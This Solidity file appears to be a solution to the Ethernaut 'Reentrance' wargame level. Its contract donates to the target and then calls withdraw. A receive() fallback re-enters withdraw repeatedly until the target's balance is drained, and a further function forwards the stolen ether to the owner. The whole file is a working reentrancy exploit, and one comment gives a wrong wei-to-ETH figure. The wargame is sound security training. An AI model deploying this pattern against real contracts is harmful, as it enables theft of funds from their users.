// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import './Reentrance.sol';

contract EthernautReentrancyAttack {
    Reentrance public target; 
    address public owner;
    uint targetValue = 1000000000000000 wei; //0.01 ETH is all balance of contract
   
    constructor(address payable _targetAddr) public {
        target = Reentrance(_targetAddr);
        owner = msg.sender;
    }
    
    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        target.donate.value(msg.value)(address(this));
        target.withdraw(msg.value);
    }

    //transfer back from contract to wallet
    function withdrawAll() public {
        payable(owner).transfer(address(this).balance);
    }
    

   receive() external payable {
      uint targetBalance = address(target).balance;
        if (targetBalance >= targetValue) {
            target.withdraw(targetValue);
        }
    }
}